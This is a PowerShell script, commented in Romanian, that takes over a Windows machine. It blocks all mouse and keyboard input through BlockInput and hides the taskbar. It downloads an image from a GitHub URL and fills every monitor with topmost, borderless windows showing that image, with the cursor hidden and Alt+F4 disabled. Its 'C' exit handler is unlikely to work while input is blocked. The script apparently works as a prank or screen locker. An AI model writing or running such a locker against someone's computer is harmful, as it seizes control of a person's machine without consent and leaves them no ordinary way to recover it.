Add-Type -AssemblyName System.Windows.Forms

# Cod C# pt blocare input
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

# Cod pt ascuns taskbar
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TaskbarHider {
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Ascunde Taskbar
$taskbar = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
[TaskbarHider]::ShowWindow($taskbar, 0)

# Descarcă poza dacă nu există
$tempImage = "$env:TEMP\poza_laptop.jpg"
if (-not (Test-Path $tempImage)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage
}

# Blochează mouse și tastatură
[InputBlocker]::BlockInput($true)

# Listă de ferestre pentru fiecare ecran
$forms = @()

# Funcție pentru închidere completă
function InchideTot {
    [InputBlocker]::BlockInput($false)
    [TaskbarHider]::ShowWindow($taskbar, 1)
    foreach ($f in $forms) {
        $f.Invoke([Action]{ $f.Close() })
    }
    Stop-Process -Id $PID
}

# Creează câte o fereastră pe fiecare monitor
[System.Windows.Forms.Screen]::AllScreens | ForEach-Object {
    $screen = $_

    $form = New-Object Windows.Forms.Form
    $form.StartPosition = 'Manual'
    $form.Bounds = $screen.Bounds
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'
    $form.KeyPreview = $true
    $form.ShowInTaskbar = $false
    $form.Cursor = [System.Windows.Forms.Cursors]::None

    $pictureBox = New-Object Windows.Forms.PictureBox
    $pictureBox.ImageLocation = $tempImage
    $pictureBox.SizeMode = 'Zoom'
    $pictureBox.Dock = 'Fill'
    $form.Controls.Add($pictureBox)

    # Dacă se apasă C — închide tot
    $form.Add_KeyDown({
        if ($_.KeyCode -eq 'C') {
            InchideTot
        }
    })

    # Blochează Alt+F4
    $form.Add_FormClosing({
        if ($_.CloseReason -eq "UserClosing") {
            $_.Cancel = $true
        }
    })

    $null = $form.Show()
    $forms += $form
}

# Pornește loop-ul pe prima fereastră
[System.Windows.Forms.Application]::Run($forms[0])
